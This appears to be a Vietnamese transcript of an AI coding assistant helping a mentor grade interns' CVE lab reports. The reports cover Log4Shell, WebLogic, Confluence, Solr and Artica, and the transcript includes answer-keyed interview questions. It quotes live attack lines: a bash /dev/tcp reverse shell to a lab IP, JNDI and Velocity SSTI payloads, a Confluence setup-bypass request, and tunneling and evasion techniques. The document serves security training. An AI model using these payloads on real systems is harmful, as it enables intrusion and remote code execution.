> **Đáp án:** Nếu `secure_file_priv='/tmp'` thì `SELECT INTO DUMPFILE` chỉ ghi vào `/tmp`. Mà MySQL UDF library phải nằm trong `plugin_dir` (thường `/usr/lib/mysql/plugin/` hoặc `/opt/lampp/lib/mysql/plugin/`). Không thể ghi trực tiếp vào plugin_dir → UDF injection thất bại. Tuy nhiên, có workaround: (1) Nếu có symlink từ plugin_dir sang /tmp (hiếm), (2) Dùng SQL `LOAD DATA LOCAL INFILE` nếu được enable, (3) Tìm cách khác không dùng UDF — ví dụ viết reverse shell vào /tmp rồi execute qua crontab nếu crontab gọi script trong /tmp.

**Q4: "Nếu firewall có DPI phát hiện Chisel traffic, em có phương án thay thế?"**

> **Đáp án:** Các phương án thay thế: (1) **SSH tunnel** nếu SSH server có sẵn trên DMZ, (2) **DNS tunneling** (dnscat2, iodine) — DPI khó detect vì traffic giống DNS query bình thường, (3) **Chisel qua HTTPS** — Chisel hỗ trợ wrap trong TLS, DPI thấy encrypted traffic hợp lệ, (4) **HTTP tunnel** (reGeorg, Neo-reGeorg) — webshell trên Tomcat tạo SOCKS proxy qua HTTP request bình thường, (5) **Domain fronting** nếu có CDN. Trong scenario này, vì đã có webshell trên DMZ, Neo-reGeorg webshell tunnel qua HTTP port 8080 là phương án ít bị detect nhất.

**Q5: "Phần xóa dấu vết: còn artifact nào blue team phát hiện được?"**

> **Đáp án:** Nhiều artifact còn sót: (1) **Network logs trên pfSense** — firewall ghi nhận connection WAN→DMZ, DMZ→LAN bất thường, (2) **Tomcat access.log** — request chứa payload Spring4Shell, (3) **MySQL general/slow query log** — câu lệnh UDF injection, (4) **Filesystem timestamps** — mtime/atime/ctime của shell.jsp, udf_shell.so, (5) **Process accounting** — nếu auditd/sysmon enable, ghi nhận reverse shell process, (6) **Network traffic capture** — Chisel tunnel traffic trên pfSense, (7) **/proc/*/fd** — file descriptors của deleted files vẫn tồn tại nếu process đang chạy. Blue team kinh nghiệm sẽ kiểm tra pfSense logs đầu tiên.

---

## 3. NGUYỄN HỮU DŨNG — CVE-2020-14882 & CVE-2020-14883 (WebLogic)

### Nhận xét hình ảnh:
- **Lab structure**: File explorer VS Code rõ — `Manual_NodeJS_Lab` gồm views (dashboard.html, index.html, login.html), nc.exe, securityFilter.js, server.js, vulnerableRouter.js. Tự code hoàn toàn.
- **UI**: Trang web mô phỏng WebLogic rất đẹp — "Oracle WebLogic Server", "Server is Running", IP 127.0.0.1:7001.
- **Burp Suite**: Sử dụng Burp Suite Professional bắt request, phân tích HTTP history, thấy redirect 302 khi vào `/console/`.
- **Bypass PoC**: Screenshot dashboard "Đã xâm nhập hệ thống (Bypassed)" + domain structure + file system + RCE terminal output — rất trực quan.
- **RCE**: Thực thi `dir` qua handle parameter, kết quả hiển thị directory listing trên web. Thực thi `type securityFilter.js` đọc source code — chứng minh RCE thực sự.
- **Patch code**: 3 file code fix rõ ràng — securityFilter.js (double decode + blacklist `..`), server.js (chặn handle parameter trả 403), vulnerableRouter.js (single decode + `..` check + try/catch malformed URI).

**Điểm giữ nguyên: 8.5/10** — Lab NodeJS sáng tạo, Burp Suite sử dụng chuyên nghiệp.

### Câu hỏi kèm đáp án:

**Q1: "Lab NodeJS mô phỏng WebLogic — có điểm nào khác biệt so với WebLogic thật?"**

> **Đáp án:** Điểm giống: (1) Cơ chế securityFilter kiểm tra URL bề mặt bằng startsWith giống WebLogic authentication filter, (2) Double decoding vulnerability tái tạo chính xác, (3) Handle parameter reflection mô phỏng class loading. Điểm khác: (1) WebLogic thật dùng Java Servlet Filter chain, NodeJS dùng middleware — execution model khác, (2) RCE trên WebLogic thật qua Java Reflection gọi `com.tangosol.coherence.mvel2.sh.ShellSession` — class thật trên Coherence library, còn NodeJS dùng `exec()` — đơn giản hơn nhiều, (3) WebLogic thật có nhiều lớp bảo vệ (SecurityManager, WebLogic Security Framework), NodeJS không có, (4) URL parsing trên Tomcat/WebLogic (Java) có quirks khác với NodeJS `decodeURIComponent`.

**Q2: "Chi tiết quá trình double encoding: tại sao middleware chỉ thấy `%2e` mà không thấy `..`?"**

> **Đáp án:** Quy trình: Attacker gửi `%252e%252e%252f`. **Bước 1** (Browser/HTTP layer): HTTP spec yêu cầu decode URL 1 lần → `%25` → `%`, `2e` giữ nguyên → kết quả `%2e%2e%2f`. **Bước 2** (securityFilter): Kiểm tra raw URL đã qua decode lần 1 → thấy `%2e%2e%2f`, **không phải** `../` → cho qua vì startsWith('/console/images/') match. **Bước 3** (vulnerableRouter): Gọi `decodeURIComponent()` lần 2 → `%2e` → `.`, `%2f` → `/` → thành `../`. Vấn đề core: 2 component decode URL số lần khác nhau → nhìn URL khác nhau (parsing inconsistency).

**Q3: "Ngoài `ShellSession`, class nào khác trên WebLogic bị lạm dụng RCE?"**

> **Đáp án:** Trên WebLogic thật có nhiều gadget class: (1) `com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext` — load remote XML chứa bean definition độc hại, (2) `com.tangosol.coherence.mvel2.sh.ShellSession` — thực thi MVEL script (phổ biến nhất), (3) `oracle.toplink.internal.sessions.UnitOfWorkChangeSet` — deserialization gadget, (4) `weblogic.jndi.Environment` + JNDI injection. Oracle đã patch bằng cách thêm class vào blacklist, nhưng researcher liên tục tìm ra class mới → cuộc đua "whack-a-mole" giữa attacker và vendor.

**Q4: "Bản vá dùng blacklist `..` — có cách bypass không?"**

> **Đáp án:** Các vector bypass tiềm năng: (1) **Triple encoding** `%25252e` → nhưng bản vá đã double-decode trước khi check nên chặn được, (2) **Unicode normalization**: `.` có thể biểu diễn bằng Unicode fullwidth `%EF%BC%8E` hoặc `%u002e` — nếu decode engine xử lý Unicode, có thể bypass, (3) **Backslash**: Windows xử lý `..\\` tương đương `../` — nếu chỉ check `..` + `/` mà thiếu `\\`, (4) **URL encoding lẻ**: `..%2f` hoặc `%2e./` — bản vá check `..` trong decoded string nên chặn được. Bản vá của em khá vững vì check `includes('..')` sau decode, nhưng nên dùng thêm path canonicalization (`path.normalize()`) để chắc chắn hơn.

**Q5: "So sánh bản vá NodeJS của em với bản vá Oracle chính thức?"**

> **Đáp án:** Oracle vá bằng cách: (1) Thêm validation trong `ConsoleSecurityFilter` — decode URL đầy đủ trước khi kiểm tra quyền (giống bản vá em ở securityFilter.js), (2) Restrict handle parameter — chặn reflection đến các class nguy hiểm bằng whitelist (em dùng blacklist 403 — whitelist tốt hơn), (3) Oracle Critical Patch Update (CPU) October 2020 patch cả 2 CVE cùng lúc. Điểm khác: Oracle dùng **whitelist** (chỉ cho phép class đã biết), em dùng **blacklist** (chặn hành vi xấu). Whitelist an toàn hơn vì chặn cả unknown attack vector.

---

## 4. TRẦN VIỆT BÁCH — CVE-2021-44228 (Log4Shell)

### Nhận xét hình ảnh (CẬP NHẬT QUAN TRỌNG):

Sau khi xem hình ảnh, tôi **nâng điểm đáng kể** cho Trần Việt Bách:

- **Sơ đồ Lab**: Thực ra rất chi tiết — 4 thành phần: HTTP Server (Kali, 192.168.58.135:8000), LDAP Server (Kali, 192.168.58.135:1389), Attacker listener (Kali, 192.168.58.135), Web Server (Ubuntu, 192.168.58.140). Luồng 6 bước đánh số rõ ràng.
- **Web app**: FastFood app trên 192.168.58.130:8080/log4j-lab/, form login Username/Password.
- **Exploit.java**: Screenshot full code — implements `ObjectFactory`, static block chứa reverse shell `bash -i >& /dev/tcp/192.168.58.135/4444 0>&1`, override `getObjectInstance()`. Đây là code tự viết.
- **LDAP server**: Dùng marshalsec `LDAPRefServer` trỏ JavaCodeBase đến HTTP server.
- **Payload injection**: Nhập `${jndi:ldap://192.168.58.135:1389/Exploit}` vào trường Username.
- **Reverse shell**: `whoami` = `bach123` trên `bach123-VMware-Virtual-Platform:~/apache-tomcat-9.0.65$`.

**PHÁT HIỆN QUAN TRỌNG — Phần debug code rất xuất sắc:**
- **10+ screenshot debug** với breakpoint trong IntelliJ/VS Code, trace qua:
  1. `Login.java` doPost → `logger.info(" username: " + userName)` — entry point
  2. `XmlConfiguration` → phát hiện ký tự `${` trong log message
  3. `StrSubstitutor.substitute()` → tách `varNameExpr = "jndi:ldap://..."`
  4. `replace()` → tạo StringBuilder buffer
  5. `resolveVariable()` → gọi `resolver.lookup(event, variableName)`
  6. `Interpolator.lookup()` → tách `prefix="jndi"`, `name="ldap://..."`
  7. `JndiLookup.lookup()` → `convertJndiName(key)`
  8. `JndiManager.lookup()` → `jndiManager.lookup(jndiName)`
  9. `InitialContext.lookup(name)` → trigger LDAP connection

Đây là **debug trace thực sự** trong source code Log4j, không phải copy — thể hiện hiểu sâu luồng xử lý.

- **Patch**: Ảnh cho thấy `log4j-api` + `log4j-core` version 2.14.1 (vulnerable) → 2.25.2 (patched). Tuy nhiên **vẫn thiếu giải thích cơ chế fix**.

**Điểm cập nhật: 7/10** (tăng từ 4.5 — phần debug code trace rất ấn tượng, nhưng text giải thích vẫn quá ít, patch analysis vẫn yếu)

### Câu hỏi kèm đáp án:

**Q1: "Giải thích payload `${jndi:ldap://IP:1389/Exploit}` — nếu thay `ldap` bằng `rmi` hoặc `dns` thì sao?"**

> **Đáp án:** Payload gồm: `${}` là cú pháp lookup của Log4j, `jndi:` chỉ định dùng JNDI Lookup plugin, `ldap://` là protocol. **Thay `rmi`**: `${jndi:rmi://IP:1099/Exploit}` — vẫn RCE được, RMI (Remote Method Invocation) cũng load remote class, nhưng Java 8u121+ đã mặc định disable remote codebase cho RMI. **Thay `dns`**: `${jndi:dns://attacker.com/a}` — chỉ trigger DNS lookup, **không RCE** được, nhưng hữu ích cho **detection** (kiểm tra hệ thống có vulnerable không). **Thay `ldaps`**: Tương tự LDAP nhưng qua TLS. **Thay `iiop`**: CORBA protocol, ít phổ biến.

**Q2: "File Exploit.java implements ObjectFactory — tại sao phải dùng ObjectFactory? Static block có vai trò gì?"**

> **Đáp án:** `ObjectFactory` là interface trong JNDI specification. Khi LDAP server trả về response có `javaCodeBase` trỏ đến HTTP server + `javaFactory=Exploit`, Java client sẽ: (1) Download `Exploit.class` từ HTTP server, (2) Load class vào JVM, (3) Gọi `getObjectInstance()` vì class implement `ObjectFactory`. **Static block** (`static { ... }`) được thực thi **ngay khi class được load vào JVM** — trước cả constructor hay bất kỳ method nào. Nên reverse shell command trong static block chạy ngay lập tức khi class được download và load, không cần chờ `getObjectInstance()`.

**Q3: "Trong debug trace, hàm `StrSubstitutor.substitute()` làm gì cụ thể? Tại sao nó recursive?"**

> **Đáp án:** `StrSubstitutor.substitute()` quét chuỗi log tìm pattern `${...}`. Khi tìm thấy, nó: (1) Trích xuất nội dung giữa `${` và `}` thành `varNameExpr`, (2) Kiểm tra `substitutionInVariablesEnabled` — nếu true, **recursive**: resolve nested `${}` bên trong trước (VD: `${${lower:j}ndi:...}`) → đây là lý do CVE-2021-45046 bypass bản vá 2.15.0, (3) Gọi `resolveVariable()` để thực hiện lookup. Tính recursive nguy hiểm vì cho phép attacker lồng nhiều tầng payload để bypass filter (VD: `${${env:BARFOO:-j}ndi:...}`).

**Q4: "Bản vá Log4j 2.15.0 fix chưa đủ, phải đến 2.17.0 — tại sao?"**

> **Đáp án:** **2.15.0**: Disable JNDI lookup by default, thêm allowlist cho LDAP hosts (localhost only). Nhưng **CVE-2021-45046** phát hiện: (1) Trong một số non-default configurations (pattern layout với Context Lookups), attacker vẫn trigger JNDI, (2) Allowlist bypass qua crafted URL. **2.16.0**: Disable message lookups hoàn toàn, remove JNDI support trừ `JndiManager`. Nhưng **CVE-2021-45105**: Infinite recursion DoS qua `${${::-${::-$${::-j}}}}`. **2.17.0**: Fix recursion, chỉ cho phép JNDI dùng `java:` protocol (local only), disable remote protocols hoàn toàn. **2.17.1**: Fix thêm CVE-2021-44832 (RCE qua JDBC Appender khi attacker control config). Kết luận: phải dùng >= 2.17.1 mới thực sự an toàn.

**Q5: "Nếu hệ thống air-gapped (không Internet), Log4Shell có khai thác được không?"**

> **Đáp án:** Có, nhưng khó hơn nhiều. Payload tiêu chuẩn cần victim connect đến LDAP server bên ngoài → air-gapped chặn được RCE path. Tuy nhiên: (1) **Information leak vẫn có**: `${jndi:dns://...}` không cần, nhưng `${env:AWS_SECRET_ACCESS_KEY}` hay `${sys:user.name}` có thể leak qua error message hoặc response, (2) Nếu attacker đã có foothold trong mạng air-gapped (VD: qua USB), có thể setup LDAP server nội bộ, (3) **JNDI local** vẫn hoạt động: `${jndi:java:comp/env/...}` truy cập JNDI resources nội bộ. Kết luận: air-gapped giảm thiểu RCE đáng kể nhưng không loại bỏ hoàn toàn rủi ro.

**Q6 (Bổ sung — quan trọng): "Em đã debug rất chi tiết luồng code. Giải thích cho anh tại sao một thư viện logging lại cần tính năng JNDI Lookup?"**

> **Đáp án:** JNDI Lookup được thêm vào Log4j 2 từ 2013 với mục đích: cho phép log message tự động resolve thông tin từ môi trường runtime — VD: `${jndi:java:comp/env/appName}` để log tên ứng dụng từ JNDI context, hoặc `${jndi:ldap://ldap-server/cn=config}` để lấy config logging từ LDAP directory. Ý tưởng ban đầu hợp lý cho enterprise environment (nhiều app dùng chung LDAP/Active Directory). Vấn đề: **user input không bao giờ nên được lookup** — nhưng Log4j xử lý `${}` trong **mọi** log message, kể cả message chứa user input như username, User-Agent, etc. Đây là vi phạm nguyên tắc "data/code separation".

---

## 5. ĐÀM PHƯƠNG LINH — CVE-2023-22515 (Confluence)

### Nhận xét hình ảnh:
- **Attack flow diagram**: Sơ đồ flowchart rất chuyên nghiệp — Attacker → ServerInfoAction (Root Object, không cần auth) → SafeParameterInterceptor (ASTChain a.b.c) → BootstrapStatusProviderImpl → ApplicationConfig.setSetupComplete(false) → SetupCheckInterceptor thấy false → cho vào setup → tạo admin trái phép.
- **Struts.xml**: Screenshot code `struts.xml` với action `server-info` class `ServerInfoAction` được highlight đỏ — bản 8.5.1 có, 8.5.2 đã xóa.
- **ServerInfoAction.class**: Decompiled code — extends `ConfluenceActionSupport`, annotation `@PublicAccess`, `@XsrfProtectionExcluded`.
- **Burp Suite**: Repeater với payload `GET /server-info.action?bootstrapStatusProvider.applictionConfig.setupComplete=0` → Response 302 redirect `/bootstrap/selectsetupstep.action` — chứng minh state bị thay đổi.
- **Setup page**: `Configure System Administrator Account` trên 10.48.137.228:8090 — bypass thành công.
- **Admin panel**: Đăng nhập thành công "Dam Phuong Linh" với quyền "Administer User" trên Confluence.

**Điểm giữ nguyên: 9/10** — Hình ảnh xác nhận phân tích sâu, PoC rõ ràng qua Burp.

### Câu hỏi kèm đáp án:

**Q1: "SafeParametersInterceptor khác gì ParametersInterceptor? Tại sao 'Safe' vẫn bị bypass?"**

> **Đáp án:** `ParametersInterceptor` gốc của Struts2 cho phép bind **mọi** parameter vào action properties — dẫn đến OGNL injection. Atlassian tạo `SafeParametersInterceptor` kế thừa nó, thêm restriction: chặn `ASTEval` (execute expression), chỉ cho phép `ASTChain` (property access dạng a.b.c). Lý do vẫn bị bypass: ASTChain tuy "safe" hơn (không execute arbitrary expression), nhưng vẫn cho phép **traversal qua getter/setter chain** — `bootstrapStatusProvider.applicationConfig.setupComplete` thực chất gọi `getBootstrapStatusProvider().getApplicationConfig().setSetupComplete(0)`. "Safe" chỉ an toàn nếu object graph không chứa critical state — nhưng `setupComplete` lại là critical state.

**Q2: "ASTEval vs ASTChain trong OGNL — sự khác biệt?"**

> **Đáp án:** OGNL (Object-Graph Navigation Language) parse expression thành AST (Abstract Syntax Tree). **ASTEval** node cho phép evaluate arbitrary expression — VD: `(#rt = @java.lang.Runtime@getRuntime(), #rt.exec('calc'))` → RCE trực tiếp. **ASTChain** node chỉ cho phép navigate object graph qua dot notation — VD: `a.b.c` → `getA().getB().getC()`. Confluence chặn ASTEval vì nó quá nguy hiểm. Nhưng ASTChain vẫn có thể: (1) Gọi setter — `a.b.c=value` → `getA().getB().setC(value)`, (2) Traversal đến internal objects. CVE-2023-22515 chỉ cần setter → ASTChain đủ.

**Q3: "Nếu `/server-info.action` bị xóa, em tìm attack surface mới thế nào?"**

> **Đáp án:** Phương pháp variant analysis: (1) Dùng tool decompile (JD-GUI, CFR) scan toàn bộ JAR file trong `WEB-INF/lib`, (2) Tìm mọi action class extends `ConfluenceActionSupport` có annotation `@PublicAccess` (không cần auth), (3) Kiểm tra xem action đó có dùng `defaultStack` interceptor (chứa SafeParametersInterceptor → cho phép data binding), (4) Từ action đó, trace object graph xem có đường nào reach tới critical state (setupComplete, admin permissions, etc.), (5) Kiểm tra struts.xml xem có action nào khác không cần auth. Nếu Atlassian chỉ xóa 1 endpoint mà không fix root cause (mutable state + unsafe binding), attacker có thể tìm endpoint khác.

**Q4: "ReadOnlyApplicationConfig chặn setter — nếu có Java reflection vulnerability bypass wrapper thì sao?"**

> **Đáp án:** Nếu attacker bypass ReadOnly wrapper qua reflection (VD: `Field.setAccessible(true)` rồi modify trực tiếp), chuỗi tấn công sẽ: (1) Cần tìm cách inject reflection code — khó vì SafeParametersInterceptor chặn ASTEval, (2) Nếu có deserialization vulnerability riêng, có thể chain: deser → reflection → bypass ReadOnly → set setupComplete=false → tạo admin. Tuy nhiên, bản vá 8.5.2 có 3 lớp bảo vệ đồng thời: xóa endpoint + ReadOnly wrapper + không expose object thật → bypass cần break cả 3. Đây là ví dụ tốt về **defense in depth**.

**Q5: "CVSS 10.0 — so sánh với Log4Shell (cũng 10.0), cái nào nguy hiểm hơn thực tế?"**

> **Đáp án:** Log4Shell nguy hiểm hơn trong thực tế vì: (1) **Phạm vi ảnh hưởng**: Log4j được dùng trong hàng triệu ứng dụng Java (Spring, Minecraft, Apple iCloud, etc.) vs Confluence chỉ ~100K instances, (2) **Ease of exploitation**: Log4Shell trigger qua bất kỳ input nào được log (User-Agent, URL, etc.) vs CVE-22515 cần biết endpoint cụ thể, (3) **Transitive dependency**: Log4j là dependency ẩn trong nhiều library → team không biết mình dùng, (4) **Stealth**: Log4Shell payload nhỏ, có thể giấu trong header; CVE-22515 cần nhiều request. Tuy nhiên CVE-22515 nguy hiểm hơn ở điểm: không cần victim connect ra ngoài (no outbound needed), trong khi Log4Shell standard payload cần victim fetch class từ attacker server.

---

## 6. PHẠM LÊ NAM — CVE-2019-17558 (Apache Solr)

### Nhận xét hình ảnh:
- **Sơ đồ**: Đơn giản nhưng đủ — Attacker (Kali) ↔ Máy chủ Solr 8.3.0. Thiếu IP cụ thể trên sơ đồ (nhưng có trong ảnh command: 192.168.10.10).
- **Solr setup**: Dashboard Solr Admin 8.3.0, core "demo" đã tạo.
- **Nmap**: Host discovery `nmap -sn 192.168.10.1/24` + port scan `nmap -sV -p 8983 192.168.10.10` → Apache Solr.
- **Version check**: `curl` API `/admin/info/system?wt=json` → "solr-spec-version": "8.3.0".
- **Config API payload**: Screenshot rõ request POST `/solr/demo/config` với JSON body `"update-queryresponsewriter"` setting `"params.resource.loader.enabled": "true"`. Đây là bước bật Velocity params loading.
- **SSTI payload**: Screenshot full curl command với Velocity template: `v.template=custom`, `v.template.custom=#set($x="")#set($rt=$x.class.forName("java.lang.Runtime"))#set($ex=$rt.getRuntime().exec("bash -c {echo,Base64_reverse_shell}|{base64,-d}|{bash,-i}"))$ex.waitFor()`. Payload rõ ràng.
- **Reverse shell**: `whoami` = `nam-b21dcat` trên `/solr-8.3.0/server/`.
- **Root cause code**: Screenshot code `VelocityResponseWriter` kiểm tra `params.resource.loader.enabled` — nếu true thì `velocityEngine.setProperty("params.resource.loader.class", "StringResourceLoader")`.
- **Patch**: UFW firewall (`ufw allow from 192.168.10.8`, `ufw deny 8983`), solrconfig.xml cấu hình VelocityResponseWriter.

**Điểm cập nhật: 6.5/10** (tăng từ 5.5 — hình ảnh cho thấy payload chi tiết hơn text, có screenshot code root cause, nhưng patch analysis vẫn sơ sài)

### Câu hỏi kèm đáp án:

**Q1: "Giải thích chi tiết body của Config API request. Tại sao Solr cho phép thay đổi config mà không cần auth?"**

> **Đáp án:** Request POST `/solr/demo/config` với body `{"update-queryresponsewriter": {"name": "velocity", "class": "solr.VelocityResponseWriter", "params.resource.loader.enabled": "true"}}`. Ý nghĩa: Solr Config API cho phép runtime config overlay — thay đổi cấu hình mà không cần restart. `update-queryresponsewriter` cập nhật component xử lý response format. Setting `params.resource.loader.enabled=true` cho phép nhận Velocity template trực tiếp từ URL query parameter. **Tại sao không auth**: Solr ở version <= 8.1 không có authentication framework built-in. Từ 8.2 có `BasicAuth` plugin nhưng mặc định TẮT. Solr thiết kế ban đầu cho nội bộ (behind firewall), không tính đến exposure ra Internet → Config API mở toàn quyền.

**Q2: "VelocityResponseWriter là gì? Tại sao `params.resource.loader.enabled=true` nguy hiểm?"**

> **Đáp án:** VelocityResponseWriter là một ResponseWriter plugin trong Solr, dùng Apache Velocity template engine để render kết quả search thành HTML/custom format. Mặc định, Velocity chỉ load template từ file trên disk (template.base.dir). Khi `params.resource.loader.enabled=true`: Velocity thêm `StringResourceLoader` → chấp nhận template content trực tiếp từ HTTP query parameter `v.template.custom=...`. Điều này biến URL thành **code injection point**: attacker viết Velocity template chứa `#set($rt=$x.class.forName("java.lang.Runtime"))` → Velocity evaluate template → Java reflection → `Runtime.exec()` → RCE. Bản chất là SSTI (Server-Side Template Injection).

**Q3: "Phân tích từng phần payload Velocity template."**

> **Đáp án:** Payload: `#set($x="")` → tạo biến String rỗng. `#set($rt=$x.class.forName("java.lang.Runtime"))` → từ String object, gọi `.class` lấy Class object, rồi `forName()` load class `java.lang.Runtime` — đây là Java Reflection. `#set($ex=$rt.getRuntime().exec("..."))` → gọi static method `getRuntime()` lấy Runtime instance, rồi `exec()` thực thi OS command. `$ex.waitFor()` → chờ process kết thúc. Command thực thi: `bash -c {echo,Base64_payload}|{base64,-d}|{bash,-i}` — Base64 encode reverse shell để tránh special characters trong URL. Tóm lại: SSTI → Java Reflection → Runtime.exec() → OS command.

**Q4: "SSTI trong Solr Velocity so với SSTI Jinja2 (Python) — nguyên lý chung?"**

> **Đáp án:** Nguyên lý chung của SSTI: **Template engine được cung cấp user-controlled input làm template code thay vì data**. Mọi SSTI đều follow pattern: (1) Tìm cách escape sandbox/context, (2) Reach đến dangerous function (OS command, file I/O), (3) Execute. **Velocity (Java)**: `#set($x="").class.forName("java.lang.Runtime").getRuntime().exec()` — escape qua Java Reflection. **Jinja2 (Python)**: `{{''.__class__.__mro__[1].__subclasses__()[xxx]('cmd',shell=True)}}` — escape qua Python MRO (Method Resolution Order) chain. **FreeMarker (Java)**: `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("cmd")}`. Nguyên lý giống: từ một object trong template context, traverse class hierarchy đến method thực thi command.

**Q5: "Bản vá chính thức Solr 8.4.0 thay đổi gì? `params.resource.loader.enabled` mặc định là gì?"**

> **Đáp án:** Solr 8.4.0 (SOLR-13971): (1) `params.resource.loader.enabled` mặc định = **false** và **không thể thay đổi qua Config API** nữa (hardcoded), (2) Thêm comment trong `solrconfig.xml`: param này chỉ để development, KHÔNG dùng production, (3) VelocityResponseWriter bị đánh dấu deprecated từ 8.6, removed từ 9.0. **Ngoài ra**, từ Solr 9.0: Config API yêu cầu authentication, không thể gọi anonymous. Em chỉ nêu "update version" và "disable velocity" — chưa phân tích code thay đổi gì cụ thể.

**Q6: "Trong ảnh solrconfig.xml, em thấy `${velocity.params.resource.loader.enabled}` — giá trị này resolve từ đâu?"**

> **Đáp án:** Cú pháp `${velocity.params.resource.loader.enabled}` là Solr property substitution — resolve từ: (1) JVM system property (`-Dvelocity.params.resource.loader.enabled=true`), (2) `solr.xml` properties, (3) `solrcore.properties`, (4) Environment variable. Nếu không set ở đâu → default = null → VelocityResponseWriter treat as false. Nhưng vì Config API cho phép override runtime → attacker POST request thay đổi giá trị này thành true mà không cần access file system. Bản vá: Config API không được phép override `params.resource.loader.enabled` nữa.

---

## BẢNG TỔNG HỢP XẾP HẠNG CẬP NHẬT

| Hạng | Thực tập sinh | CVE | Điểm mới | Thay đổi | Điểm mạnh nổi bật |
|---|---|---|---|---|---|
| 1 | **Nguyễn Bá Hải Long** | CVE-2022-22965 | **9.5/10** | — | Lab 3 lớp, full kill chain WAN→DMZ→LAN, cleanup |
| 2 | **Lê Đức Hoàng** | CVE-2020-1938 | **9/10** | +0.5 | Phân tích code exploit chi tiết, root cause 4 file Java, hình ảnh PoC rõ |
| 3 | **Đàm Phương Linh** | CVE-2023-22515 | **9/10** | — | Debug Struts2 sâu nhất, attack flow diagram xuất sắc |
| 4 | **Nguyễn Hữu Dũng** | CVE-2020-14882 | **8.5/10** | — | Lab NodeJS sáng tạo, Burp Suite chuyên nghiệp |
| 5 | **Trần Việt Bách** | CVE-2021-44228 | **7/10** | +2.5 | Debug trace 10+ breakpoint qua Log4j source code rất ấn tượng |
| 6 | **Phạm Lê Nam** | CVE-2019-17558 | **6.5/10** | +1 | Payload screenshot chi tiết, root cause code có |

### Ghi chú thay đổi:
- **Trần Việt Bách** tăng nhiều nhất (+2.5) — hình ảnh debug cho thấy em hiểu sâu luồng code Log4j, chỉ là phần text giải thích quá ít. **Gợi ý cho Bách**: Bổ sung text giải thích cho mỗi screenshot debug, viết rõ phần patch analysis.
- **Phạm Lê Nam** tăng +1 — payload Config API và SSTI rõ trong ảnh, có screenshot root cause code. **Gợi ý cho Nam**: Cần bổ sung so sánh code trước/sau patch, giải thích cơ chế fix chi tiết hơn.

Trên đây là toàn bộ phân tích cập nhật sau khi xem xét cả text và hình ảnh, kèm **36 câu hỏi** (6 câu/người) **có đáp án chi tiết**.

Đặc biệt lưu ý **Trần Việt Bách** được nâng điểm đáng kể (+2.5) sau khi xem hình — em đã debug breakpoint qua 10+ class trong Log4j source code, thể hiện hiểu rất sâu luồng xử lý, chỉ là cần bổ sung text giải thích cho mỗi screenshot. Anh có thể dùng câu hỏi Q3 và Q6 để verify xem Bách có thực sự hiểu hay chỉ follow tutorial.

---

**User**

@Báo cáo tuần 2-20260410T065232Z-3-001/Báo cáo tuần 2/Nghiên cứu CVE-2024-2054-LeVanQuan.pptx thêm 1 cái này nữa và tổng hợp lại đánh giá chi tiết và câu hỏi của tất cả

---

**Cursor**

Để tôi đọc báo cáo của Lê Văn Quân trước.

Báo cáo chỉ có 9 slide. Để tôi xem hình ảnh bên trong.

Tôi đã đọc xong báo cáo của Lê Văn Quân (9 slide + 15 hình). Giờ tôi sẽ tổng hợp đánh giá chi tiết tất cả 7 báo cáo.

---

# TỔNG HỢP ĐÁNH GIÁ CHI TIẾT — 7 BÁO CÁO TUẦN 2

---

## 7. LÊ VĂN QUÂN — CVE-2024-2054 (Artica Proxy PHP Deserialization)

### Nội dung báo cáo (9 slide):
- **Slide 1**: Trang bìa
- **Slide 2-3**: Giới thiệu Artica Proxy (proxy gateway, web filtering, LDAP, monitoring) và tổng quan CVE (CVSS 9.8, ảnh hưởng v4.40, v4.50, PHP deserialization → RCE với quyền www-data). Có ảnh Exploit-DB và bài blog SonicWall.
- **Slide 4-5**: Phân tích nguyên nhân — thư mục `/wizard/` chứa Installation Wizard (class.wizard.inc, wiz.wizard.php, wiz.wizard.progress.php, wiz.upload.php) vẫn truy cập được sau khi cài đặt xong. Lỗi thiết kế logic: file wizard không bị xóa/khóa. Ảnh giao diện wizard trên https://192.168.27.195:9000.
- **Slide 6**: Phân tích code `step_finish()` trong `wiz.wizard.php` — tạo mảng `$ARRAY`, `base64_encode(serialize($ARRAY))`, truyền qua parameter `content` đến `wiz.wizard.progress.php`.
- **Slide 7**: Code `buildjs()` trong `wiz.wizard.progress.php` — dòng 138: `$ARRAY = unserialize(base64_decode($_GET["build-js"]))` — **unserialize trực tiếp user input không validation**.
- **Slide 8**: Gadget chain — class `Net_DNS2_Cache_File` extends `Net_DNS2_Cache`, có magic method `__destruct()` gọi `fopen($this->cache_file, 'a+')` + `fwrite($fp, $data)` → **arbitrary file write**.
- **Slide 9**: Autoload mechanism — `spl_autoload_register('Net_DNS2::autoload')` trong DNS2.inc, hàm `autoload($name)` tự động include file khi class Net_DNS2 được unserialize.

### Đánh giá theo yêu cầu:

| Yêu cầu | Đánh giá | Ghi chú |
|---|---|---|
| 1. Dựng Lab thủ công | THIẾU | Hoàn toàn không có mô tả lab. Chỉ thấy IP 192.168.27.195:9000 trong 1 screenshot |
| 2. Mô tả kiến trúc | THIẾU | Không có sơ đồ hệ thống, không mô tả attacker/target, không có luồng hoạt động |
| 3. Khai thác lỗ hổng | THIẾU | Không có bước khai thác nào. Không có recon, không gửi payload, không có exploit script |
| 4. PoC | THIẾU | Không có bất kỳ chứng minh khai thác thành công nào |
| 5. Phân tích lỗ hổng | ⭐⭐⭐⭐ | Đây là phần tốt nhất — phân tích code flow từ step_finish() → serialize → buildjs() → unserialize, gadget chain Net_DNS2_Cache_File → __destruct() → fwrite, autoload mechanism. Rõ ràng |
| 6. Phân tích bản vá | THIẾU | Hoàn toàn không có |

**Tổng đánh giá: 3.5/10** — Báo cáo **chưa hoàn thành**. Chỉ đáp ứng 1/6 yêu cầu (phân tích lỗ hổng). 5/6 yêu cầu còn lại hoàn toàn thiếu: không lab, không sơ đồ, không khai thác, không PoC, không patch analysis. Phần phân tích root cause khá tốt — hiểu rõ PHP deserialization chain, nhưng dừng ở lý thuyết mà chưa thực hành.

### Câu hỏi kèm đáp án cho Lê Văn Quân:

**Q1: "PHP `unserialize()` nguy hiểm thế nào? Tại sao `unserialize(base64_decode($_GET['build-js']))` là lỗi nghiêm trọng?"**

